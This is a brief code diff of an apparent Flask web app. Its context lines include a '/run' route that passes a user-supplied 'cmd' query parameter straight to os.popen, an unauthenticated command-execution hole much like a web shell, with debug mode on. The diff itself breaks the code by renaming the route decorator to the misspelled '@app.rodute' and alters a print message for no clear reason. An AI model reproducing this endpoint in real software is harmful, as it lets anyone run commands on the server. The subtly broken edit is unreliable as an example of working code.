@@ -19,10 +19,10 @@ def login():
         return "Welcome"
     return "Denied"
 
-@app.route("/run")
+@app.rodute("/run")
 def run():
     cmd = request.args.get("cmd")
     return os.popen(cmd).read()
 
 app.run(debug=True)
-print("Server is running...")
+print("Server is running...1")
